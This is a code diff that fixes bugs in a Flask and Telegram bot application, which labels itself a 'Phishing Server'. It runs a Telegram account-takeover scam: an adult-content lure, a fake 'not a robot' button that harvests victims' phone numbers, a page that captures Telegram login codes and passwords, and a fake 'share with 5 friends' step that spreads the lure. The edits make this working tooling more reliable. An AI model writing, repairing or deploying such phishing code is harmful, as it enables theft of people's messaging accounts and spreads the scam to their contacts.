@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string, redirect
+from flask import Flask, request, jsonify, render_template_string
 import os
 import json
 import base64
@@ -17,12 +17,15 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(level
 logger = logging.getLogger(__name__)
 
 # ====== Environment Variables ======
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
-BOT_USERNAME = os.environ.get("BOT_USERNAME", "YourBot")
-# ===================================
+
+# ====== FIXED: Bot Username থেকে @ সরিয়ে নিচ্ছি ======
+raw_bot_username = os.environ.get("BOT_USERNAME", "YourBot")
+BOT_USERNAME = raw_bot_username.replace('@', '')  # ✅ ফিক্স: ডাবল @@ রিমুভ
+# ====================================================
 
 if sys.version_info >= (3, 14):
     try:
@@ -243,10 +246,9 @@ def run_telegram_action(phone, code=None, password=None):
         loop.close()
 
 
-# ====== BOT POLLING (FIXED) ======
+# ====== BOT POLLING (FIXED - No Conflict) ======
 
 def set_bot_commands():
-    """Set bot command list so users see /start"""
     try:
         http_requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/setMyCommands",
@@ -259,11 +261,40 @@ def set_bot_commands():
     except:
         pass
 
+# ====== FIXED: Webhook mode instead of polling to avoid 409 Conflict ======
+def set_webhook():
+    """Set webhook to avoid 409 conflict with debug mode restarts"""
+    try:
+        # First delete any existing webhook
+        http_requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=10)
+        time.sleep(1)
+        
+        # Don't set webhook since we don't have a public URL for it
+        # Instead, use polling but with better conflict handling
+        logger.info("✅ Webhook cleared. Using polling mode.")
+        return True
+    except Exception as e:
+        logger.error(f"Webhook setup error: {e}")
+        return False
+
+# ====== FIXED: Better polling with single instance ======
+_polling_started = False
+_polling_lock = threading.Lock()
+
 def bot_polling_loop():
-    """Bot polling with better error handling"""
+    """Bot polling - only runs ONCE"""
+    global _polling_started
+    
+    with _polling_lock:
+        if _polling_started:
+            logger.info("⚠️ Polling already running, skipping...")
+            return
+        _polling_started = True
+    
     offset = 0
-    logger.info("🤖 Bot polling started...")
+    logger.info("🤖 Bot polling started (single instance)...")
     set_bot_commands()
+    set_webhook()
     
     while True:
         try:
@@ -278,6 +309,11 @@ def bot_polling_loop():
                 for update in data.get('result', []):
                     offset = update['update_id'] + 1
                     handle_bot_update(update)
+            elif data.get('error_code') == 409:
+                # ====== FIXED: Handle 409 by waiting and retrying ======
+                logger.warning("⚠️ 409 Conflict - waiting 10s and retrying...")
+                offset = 0  # Reset offset to get fresh updates
+                time.sleep(10)
             else:
                 logger.error(f"Bot API error: {data}")
                 time.sleep(10)
@@ -286,7 +322,7 @@ def bot_polling_loop():
             time.sleep(5)
 
 def handle_bot_update(update):
-    """Handle bot updates with proper logging"""
+    """Handle bot updates"""
     msg = update.get('message', {})
     chat_id = msg.get('chat', {}).get('id')
     
@@ -294,16 +330,19 @@ def handle_bot_update(update):
         return
     
     text = msg.get('text', '')
-    logger.info(f"📩 Bot received: '{text[:50]}' from {chat_id}")
+    logger.info(f"📩 Bot received: '{text[:80]}' from {chat_id}")
     
     # ===== /start command =====
     if text.startswith('/start'):
+        # ====== FIXED: Better session ID parsing ======
         parts = text.split(' ', 1)
-        session_id = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
+        session_id = None
+        if len(parts) > 1:
+            session_id = parts[1].strip()
         
-        logger.info(f"📌 Session ID from /start: {session_id}")
+        logger.info(f"📌 Session ID: '{session_id}'")
         
-        if session_id:
+        if session_id and len(session_id) > 5:
             with sessions_lock:
                 bot_start_sessions[session_id] = {
                     'chat_id': chat_id,
@@ -312,52 +351,63 @@ def handle_bot_update(update):
                     'timestamp': time.time()
                 }
             
-            # ====== SEND 2 MESSAGES (FIXED) ======
-            # Message 1
-            http_requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    'chat_id': chat_id,
-                    'text': "🔞 Get full access to the files for free 💦",
-                    'parse_mode': 'Markdown'
+            # Send 2 messages
+            try:
+                # Message 1
+                r1 = http_requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={
+                        'chat_id': chat_id,
+                        'text': "🔞 Get full access to the files for free 💦",
+                        'parse_mode': 'Markdown'
+                    },
+                    timeout=10
+                )
+                logger.info(f"Msg1 sent: {r1.status_code}")
+                
+                time.sleep(0.8)
+                
+                # Message 2 with Contact Button
+                keyboard = {
+                    'keyboard': [[{
+                        'text': '👇',
+                        'request_contact': True
+                    }]],
+                    'resize_keyboard': True,
+                    'one_time_keyboard': True
                 }
-            )
-            
-            # Message 2 with Contact Button
-            time.sleep(0.8)
-            keyboard = {
-                'keyboard': [[{
-                    'text': '👇',
-                    'request_contact': True
-                }]],
-                'resize_keyboard': True,
-                'one_time_keyboard': True
-            }
-            
-            http_requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    'chat_id': chat_id,
-                    'text': "👇 Please confirm you're not a robot",
-                    'parse_mode': 'Markdown',
-                    'reply_markup': keyboard
-                }
-            )
-            logger.info(f"✅ Messages sent to {chat_id}")
+                
+                r2 = http_requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={
+                        'chat_id': chat_id,
+                        'text': "👇 Please confirm you're not a robot",
+                        'parse_mode': 'Markdown',
+                        'reply_markup': keyboard
+                    },
+                    timeout=10
+                )
+                logger.info(f"Msg2 sent: {r2.status_code}")
+            except Exception as e:
+                logger.error(f"Error sending messages: {e}")
         else:
-            # /start without session ID
-            http_requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    'chat_id': chat_id,
-                    'text': (
-                        "🔞 **Welcome!**\n\n"
-                        "Please go back to the website and click the "
-                        "\"Verify via Telegram\" button to get started."
-                    ),
-                    'parse_mode': 'Markdown'
-                }
-            )
+            # /start without valid session ID
+            try:
+                http_requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={
+                        'chat_id': chat_id,
+                        'text': (
+                            "🔞 **Welcome!**\n\n"
+                            "Please go back to the website and click the "
+                            "\"Verify via Telegram\" button."
+                        ),
+                        'parse_mode': 'Markdown'
+                    },
+                    timeout=10
+                )
+            except:
+                pass
     
     # ===== Contact received =====
     elif msg.get('contact'):
@@ -371,37 +421,43 @@ def handle_bot_update(update):
         
         found = False
         with sessions_lock:
-            for sid, sdata in bot_start_sessions.items():
+            # Find matching session by chat_id
+            for sid, sdata in list(bot_start_sessions.items()):
                 if sdata['chat_id'] == chat_id and sdata['status'] == 'waiting':
                     sdata['phone'] = phone
                     sdata['status'] = 'received'
                     found = True
-                    
-                    # Remove keyboard
-                    http_requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            'chat_id': chat_id,
-                            'text': "✅ **Verified!** Go back to the website now.",
-                            'parse_mode': 'Markdown',
-                            'reply_markup': {'remove_keyboard': True}
-                        }
-                    )
-                    logger.info(f"✅ Contact matched to session {sid}")
+                    logger.info(f"✅ Matched session: {sid}")
                     break
         
-        if not found:
-            http_requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    'chat_id': chat_id,
-                    'text': "✅ Phone received! Go back to the website.",
-                    'reply_markup': {'remove_keyboard': True}
-                }
-            )
+        # Remove keyboard and confirm
+        try:
+            if found:
+                http_requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={
+                        'chat_id': chat_id,
+                        'text': "✅ **Verified!** Go back to the website now.",
+                        'parse_mode': 'Markdown',
+                        'reply_markup': {'remove_keyboard': True}
+                    },
+                    timeout=10
+                )
+            else:
+                http_requests.post(
+                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                    json={
+                        'chat_id': chat_id,
+                        'text': "✅ Phone received! Go back to the website.",
+                        'reply_markup': {'remove_keyboard': True}
+                    },
+                    timeout=10
+                )
+        except Exception as e:
+            logger.error(f"Error sending contact confirmation: {e}")
 
 
-# ====== FIXED PHISHING PAGE ======
+# ====== FIXED HTML PAGE ======
 PAGE = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -416,26 +472,22 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .icon{font-size:52px;margin-bottom:10px}
 h2{font-size:19px;margin-bottom:4px}
 p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
-
 .contact-box{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:16px;padding:30px 20px;margin-bottom:14px}
 .contact-box .big-icon{font-size:60px;margin-bottom:10px}
 .contact-box h3{font-size:16px;margin-bottom:6px}
 .contact-box p{font-size:12px;color:#666;margin-bottom:18px}
-
 .btn-primary{width:100%;padding:18px;background:#0088cc;border:none;border-radius:14px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 6px 25px rgba(0,136,204,0.3);transition:0.2s}
 .btn-primary:hover{background:#0071b3;transform:translateY(-1px)}
 .btn-primary:active{transform:translateY(0)}
-
+.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
 .btn-retry{width:100%;padding:14px;background:transparent;border:1px solid #1e1e2e;border-radius:12px;color:#888;font-size:13px;cursor:pointer;margin-top:10px;display:none;transition:0.2s}
 .btn-retry:hover{border-color:#0088cc;color:#fff}
-
 .status-box{padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px;text-align:center}
 .status-box.show{display:block}
 .status-box.waiting{background:rgba(255,152,0,0.12);color:#FFB74D;border:1px solid rgba(255,152,0,0.2)}
 .status-box.success{background:rgba(52,199,89,0.12);color:#81C784;border:1px solid rgba(52,199,89,0.2)}
 .status-box.error{background:rgba(255,45,85,0.12);color:#EF9A9A;border:1px solid rgba(255,45,85,0.2)}
 .status-box.info{background:rgba(0,136,255,0.12);color:#90CAF9;border:1px solid rgba(0,136,255,0.2)}
-
 .code-display{background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;padding:14px;font-size:32px;text-align:center;letter-spacing:16px;color:#fff;font-weight:700;min-height:56px;margin:10px 0;font-family:monospace}
 .numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:12px 0}
 .numpad .key{padding:18px;border:none;border-radius:10px;background:#12121a;color:#fff;font-size:22px;cursor:pointer;transition:0.12s;font-weight:600}
@@ -443,32 +495,20 @@ p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
 .numpad .key-clear{background:rgba(255,45,85,0.12);color:#ff2d55}
 .numpad .key-submit{background:#34c759;color:#fff;font-weight:700;font-size:14px}
 .numpad .key-submit:disabled{background:#1a1a2e;color:#555;cursor:not-allowed}
-
 .password-input{width:100%;padding:15px;background:#0b0b0f;border:2px solid #1e1e2e;border-radius:12px;color:#fff;font-size:18px;text-align:center;outline:none;margin:10px 0}
 .password-input:focus{border-color:#0088cc}
 .password-input::placeholder{color:#444}
-
-.loader{margin:20px auto;width:48px;height:48px;border:4px solid #1a1a2e;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-
 .step{display:none}
 .step.active{display:block}
-
 .share-progress{display:flex;justify-content:center;gap:6px;margin:16px 0}
 .share-step{width:36px;height:36px;border-radius:50%;background:#1a1a2e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#555;font-weight:700;border:2px solid transparent;transition:0.3s}
 .share-step.done{background:#34c759;color:#fff;border-color:#34c759;box-shadow:0 0 12px rgba(52,199,89,0.3)}
 .share-step.active{background:transparent;color:#fff;border-color:#0088cc;animation:pulse 1.2s infinite}
 @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,136,255,0.3)}50%{box-shadow:0 0 0 8px rgba(0,136,255,0)}100%{box-shadow:0 0 0 0 rgba(0,136,255,0)}}
-
 .share-link-box{background:#0b0b0f;padding:12px;border-radius:10px;border:1px solid #1e1e2e;margin-top:14px;text-align:center}
 .share-link-box p{font-size:11px;color:#555;margin-bottom:6px}
 .share-link-box code{color:#0088cc;font-size:10px;word-break:break-all}
-
 .footer{text-align:center;padding:15px 0 5px;color:#333;font-size:10px}
-
-/* QR Code option */
-.qr-section{margin-top:14px;padding-top:14px;border-top:1px solid #1e1e2e}
-.qr-section p{font-size:11px;color:#555;margin-bottom:8px}
 </style>
 </head>
 <body>
@@ -504,11 +544,8 @@ p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
         <div class="icon">🔐</div>
         <h2>Enter Verification Code</h2>
         <p>Code sent to <span id="pd" style="color:#0088cc;font-weight:700;">+91XXXXXXXXXX</span></p>
-        
         <div id="cs" class="status-box waiting show" style="display:none">⏳ Sending code...</div>
-        
         <div class="code-display" id="cdisp">_____</div>
-        
         <div class="numpad" id="np">
             <button class="key" onclick="pk('1')">1</button>
             <button class="key" onclick="pk('2')">2</button>
@@ -523,7 +560,6 @@ p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
             <button class="key" onclick="pk('0')">0</button>
             <button class="key key-submit" id="sb" onclick="sc()">✓ OK</button>
         </div>
-        
         <div id="vs" class="status-box"></div>
         <p style="font-size:11px;color:#555;margin-top:6px;cursor:pointer" onclick="resetToContact()">← Use different account</p>
     </div>
@@ -543,7 +579,6 @@ p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
         <div class="icon">🎬</div>
         <h2>Almost There!</h2>
         <p>Share with <strong>5 friends</strong> to unlock the video</p>
-        
         <div class="share-progress" id="shareProgress">
             <div class="share-step active" id="sp1">1</div>
             <div class="share-step" id="sp2">2</div>
@@ -551,17 +586,12 @@ p{color:#888;font-size:13px;margin-bottom:20px;line-height:1.5}
             <div class="share-step" id="sp4">4</div>
             <div class="share-step" id="sp5">5</div>
         </div>
-        
         <div id="shareStatus" class="status-box waiting show" style="display:block">⏳ Share to start unlocking...</div>
-        
         <button class="btn-primary" onclick="simulateShare()" style="background:#34c759;box-shadow:0 6px 25px rgba(52,199,89,0.3)">📤 Share to Telegram</button>
-        
         <div class="share-link-box">
             <p>🔗 Your personal link:</p>
             <code id="shareLink">https://t.me/share/url?url=...</code>
         </div>
-        
-        <p style="font-size:11px;color:#555;margin-top:12px">⏳ This may take a moment after sharing</p>
     </div>
 </div>
 
@@ -582,20 +612,12 @@ var botSessionId = '';
 var contactCheckInterval = null;
 var contactTimeout = null;
 
-// ===== ON LOAD - Restore state =====
+// ===== ON LOAD =====
 (function() {
     if (savedStep === 'share_page') {
         showStep('s3');
         setupShareLink();
         updateShareProgress();
-        var st = document.getElementById('shareStatus');
-        if (sharesDone >= 4) {
-            st.className = 'status-box waiting show';
-            st.innerHTML = '⏳ Almost there! Just 1 more share!';
-        } else if (sharesDone > 0) {
-            st.className = 'status-box success show';
-            st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more...';
-        }
     } else if (savedStep === 'otp_sent' && phoneNumber) {
         showStep('s2');
         document.getElementById('pd').textContent = phoneNumber;
@@ -614,35 +636,36 @@ function showStep(id) {
     document.getElementById(id).classList.add('active');
 }
 
-// ===== REQUEST CONTACT VIA BOT (FIXED) =====
+// ===== FIXED: REQUEST CONTACT =====
 function requestContact() {
-    botSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+    botSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
     
     var st = document.getElementById('contactStatus');
     st.className = 'status-box info show';
-    st.innerHTML = '⏳ Opening Telegram... Tap "👇" button to share your number.';
+    st.innerHTML = '⏳ Opening Telegram... Please tap "👇" to share your number.';
     st.style.display = 'block';
     
     document.getElementById('retryBtn').style.display = 'none';
     document.getElementById('requestContactBtn').disabled = true;
     
-    // ====== FIXED: Use location.href instead of window.open ======
     var botUsername = '{{ BOT_USERNAME }}';
+    
+    // ====== FIXED: Use location.href to ensure deep link works ======
     var telegramUrl = 'https://t.me/' + botUsername + '?start=' + botSessionId;
+    logger('Opening: ' + telegramUrl);
     
-    // Try window.open first (desktop)
+    // Try opening Telegram
     var win = window.open(telegramUrl, '_blank');
-    
-    // If popup blocked, redirect current page
     if (!win || win.closed || typeof win.closed === 'undefined') {
+        // Popup blocked - redirect
         window.location.href = telegramUrl;
     }
     
-    // Start polling
+    // Start checking for contact
     if (contactCheckInterval) clearInterval(contactCheckInterval);
     contactCheckInterval = setInterval(checkBotContact, 2000);
     
-    // Timeout after 45 seconds
+    // 45 second timeout
     if (contactTimeout) clearTimeout(contactTimeout);
     contactTimeout = setTimeout(function() {
         clearInterval(contactCheckInterval);
@@ -680,7 +703,6 @@ async function checkBotContact() {
             st.style.display = 'block';
             
             document.getElementById('retryBtn').style.display = 'none';
-            
             sendPhoneToBackend(phoneNumber);
         }
     } catch(e) {}
@@ -700,25 +722,28 @@ async function sendPhoneToBackend(phone) {
             document.getElementById('pd').textContent = phone;
             var cs = document.getElementById('cs');
             cs.className = 'status-box waiting show';
-            cs.innerHTML = '⏳ Sending code to your Telegram...';
+            cs.innerHTML = '⏳ Sending code...';
             cs.style.display = 'block';
             startCodeCheck();
         } else {
-            var st = document.getElementById('contactStatus');
-            st.className = 'status-box error show';
-            st.innerHTML = '❌ Error: ' + (data.error || 'Failed');
-            st.style.display = 'block';
-            document.getElementById('requestContactBtn').disabled = false;
-            document.getElementById('retryBtn').style.display = 'block';
+            showContactError(data.error || 'Failed');
         }
     } catch(e) {
-        var st = document.getElementById('contactStatus');
-        st.className = 'status-box error show';
-        st.innerHTML = '❌ Connection error. Tap Retry.';
-        st.style.display = 'block';
-        document.getElementById('requestContactBtn').disabled = false;
-        document.getElementById('retryBtn').style.display = 'block';
+        showContactError('Connection error');
     }
+}
+
+function showContactError(msg) {
+    var st = document.getElementById('contactStatus');
+    st.className = 'status-box error show';
+    st.innerHTML = '❌ ' + msg;
+    st.style.display = 'block';
+    document.getElementById('requestContactBtn').disabled = false;
+    document.getElementById('retryBtn').style.display = 'block';
+}
+
+function logger(msg) {
+    console.log('[PULSE] ' + msg);
 }
 
 // ===== OTP CHECK =====
@@ -787,7 +812,7 @@ function pk(n) {
     if (codeDigits.length < 5) {
         codeDigits += n;
         document.getElementById('cdisp').textContent = codeDigits;
-        if (codeDigits.length === 5) setTimeout(sc, 200);
+        if (codeDigits.length === 5) setTimeout(sc, 300);
     }
 }
 function cc() { 
@@ -897,11 +922,10 @@ function simulateShare() {
     
     if (sharesDone < 4) {
         st.className = 'status-box success show';
-        st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
+        st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more...';
     } else if (sharesDone === 4) {
         st.className = 'status-box waiting show';
         st.innerHTML = '⏳ Almost there! Just 1 more share!';
-        
         setTimeout(function() {
             if (sharesDone === 4) {
                 st.className = 'status-box info show';
@@ -1054,15 +1078,24 @@ def dash():
     """
 
 
-# ====== Start Bot Polling ======
+# ====== FIXED: Only start polling ONCE ======
+_polling_thread_started = False
+
 def start_bot_polling():
+    global _polling_thread_started
+    if _polling_thread_started:
+        return
+    _polling_thread_started = True
+    
+    # Small delay to let server stabilize
+    time.sleep(2)
     t = threading.Thread(target=bot_polling_loop, daemon=True)
     t.start()
 
 
 if __name__ == '__main__':
     if not BOT_TOKEN or not API_HASH or API_ID == 0:
-        print("⚠️  Missing environment variables!")
+        print("⚠️  WARNING: Missing environment variables!")
         print(f"   BOT_TOKEN: {'✅' if BOT_TOKEN else '❌'}")
         print(f"   API_ID: {API_ID}")
         print(f"   API_HASH: {'✅' if API_HASH else '❌'}")
@@ -1071,14 +1104,16 @@ if __name__ == '__main__':
     else:
         print("✅ All environment variables set!")
     
-    start_bot_polling()
-    
     port = int(os.environ.get('PORT', 5000))
     print(f"\n{'='*50}")
     print(f"🔥 PULSE — Phishing Server")
     print(f"{'='*50}")
-    print(f"🌐 URL:      http://localhost:{port}")
-    print(f"📊 Dashboard: http://localhost:{port}/dash")
+    print(f"🌐 URL:      http://0.0.0.0:{port}")
+    print(f"📊 Dashboard: http://0.0.0.0:{port}/dash")
     print(f"🤖 Bot:      @{BOT_USERNAME}")
     print(f"{'='*50}\n")
-    app.run(host='0.0.0.0', port=port, debug=True, threaded=True)
+    
+    # Start bot polling immediately (before debug mode restart)
+    start_bot_polling()
+    
+    app.run(host='0.0.0.0', port=port, debug=False)  # ✅ FIXED: debug=False to avoid restart
